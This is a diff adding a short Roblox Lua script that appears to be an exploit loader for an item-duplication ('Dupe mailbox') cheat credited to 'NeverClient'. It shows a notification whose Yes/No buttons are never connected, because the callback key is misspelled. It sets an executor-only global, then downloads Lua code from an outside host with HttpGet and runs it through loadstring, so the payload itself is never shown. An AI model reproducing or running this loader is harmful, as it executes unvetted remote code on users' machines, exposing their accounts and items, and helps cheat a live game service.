@@ -1,0 +1,23 @@
+wait(1)
+local function callback(text)
+    if text == "Yes" then
+    print("User said yes")
+    elseif text == "No" then
+    print("User said no")
+    end
+end
+ 
+local bindableFunction= Instance.new("BindableFunction")
+ 
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Dupe mailbox";
+    Text = "created by NeverClient";
+    Icon = "rbxid";
+    Duration = "15";
+    callbakc = bindableFunction;
+    Button1 = "Yes";
+    Button2 = "No";
+})
+
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/903f19168f5a902399e8cc84.lua", true))()
